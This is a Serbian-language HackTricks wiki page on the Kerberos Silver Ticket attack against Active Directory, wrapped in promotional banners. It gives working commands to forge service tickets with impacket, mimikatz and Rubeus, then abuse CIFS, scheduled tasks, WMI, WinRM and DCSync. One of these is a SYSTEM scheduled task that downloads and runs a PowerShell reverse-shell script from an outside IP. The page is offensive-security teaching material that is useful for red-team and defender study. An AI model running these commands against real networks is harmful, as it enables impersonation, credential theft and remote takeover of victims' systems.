# Silver Ticket

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJATELJSTVO**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Savet za bug bounty**: **registrujte se** za **Intigriti**, premium **platformu za bug bounty kreiranu od hakera, za hakere**! Pridružite nam se na [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) danas, i počnite da zarađujete nagrade do **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## Srebrna karta

Napad **Srebrna karta** uključuje iskorišćavanje servisnih karata u okruženjima Active Directory (AD). Ova metoda se oslanja na **dobijanje NTLM heša servisnog naloga**, kao što je nalog računara, kako bi se falsifikovala karta za uslugu dodeljivanja karata (TGS). Sa ovom falsifikovanom kartom, napadač može pristupiti određenim uslugama na mreži, **predstavljajući se kao bilo koji korisnik**, obično ciljajući administrativne privilegije. Naglašava se da je korišćenje AES ključeva za falsifikovanje karata sigurnije i manje detektovano.

Za izradu karata, koriste se različiti alati zavisno od operativnog sistema:

### Na Linux-u

```bash
python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```

### Na Windows operativnom sistemu

```bash
# Create the ticket
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"

# Inject the ticket
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```

## Dostupne usluge

| Tip usluge                                         | Srebrne karte usluga                                                          |
| -------------------------------------------------- | ----------------------------------------------------------------------------- |
| WMI                                                | <p>HOST</p><p>RPCSS</p>                                                       |
| PowerShell udaljeno upravljanje                    | <p>HOST</p><p>HTTP</p><p>Zavisno od OS-a takođe:</p><p>WSMAN</p><p>RPCSS</p>  |
| WinRM                                              | <p>HOST</p><p>HTTP</p><p>U nekim slučajevima možete samo zatražiti: WINRM</p> |
| Planirani zadaci                                   | HOST                                                                          |
| Deljenje datoteka u sistemu Windows, takođe psexec | CIFS                                                                          |
| LDAP operacije, uključujući DCSync                 | LDAP                                                                          |
| Alati za udaljeno upravljanje serverom Windows     | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                            |
| Zlatne karte                                       | krbtgt                                                                        |

Korišćenjem **Rubeus**-a možete **zatražiti sve** ove karte usluga koristeći parametar:

* `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Događaji ID-ova srebrnih karata

* 4624: Prijava na nalog
* 4634: Odjava sa naloga
* 4672: Admin prijava

## Zloupotreba karata usluga

U sledećim primerima zamislimo da je karta dobijena predstavljajući se kao administratorski nalog.

### CIFS

Sa ovom kartom moći ćete pristupiti fasciklama `C$` i `ADMIN$` putem **SMB** (ako su izložene) i kopirati datoteke na deo udaljenog fajl sistema samo radeći nešto poput:

```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```

### HOST

Sa ovlašćenjem možete generisati zakazane zadatke na udaljenim računarima i izvršiti proizvoljne komande:

```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```

### HOST + RPCSS

Sa ovim kartama možete **izvršiti WMI na sistemu žrtve**:

```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```

### HOST + WSMAN (WINRM)

Sa winrm pristupom preko računara možete **pristupiti** čak i dobiti PowerShell:

```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```

Proverite sledeću stranicu da biste saznali **više načina za povezivanje sa udaljenim hostom pomoću winrm**:

{% content-ref url="../lateral-movement/winrm.md" %}
[winrm.md](../lateral-movement/winrm.md)
{% endcontent-ref %}

{% hint style="warning" %}
Imajte na umu da **winrm mora biti aktivan i osluškivan** na udaljenom računaru da biste mu pristupili.
{% endhint %}

### LDAP

Sa ovim privilegijama možete iskopati bazu podataka DC-a koristeći **DCSync**:

```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```

**Saznajte više o DCSync** na sledećoj stranici:

## Reference

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)

{% content-ref url="dcsync.md" %}
[dcsync.md](dcsync.md)
{% endcontent-ref %}

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Savet za bug bounty**: **Prijavite se** za **Intigriti**, premium **platformu za bug bounty kreiranu od hakera, za hakere**! Pridružite nam se na [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) danas, i počnite da zarađujete nagrade do **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>Naučite AWS hakovanje od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** Proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
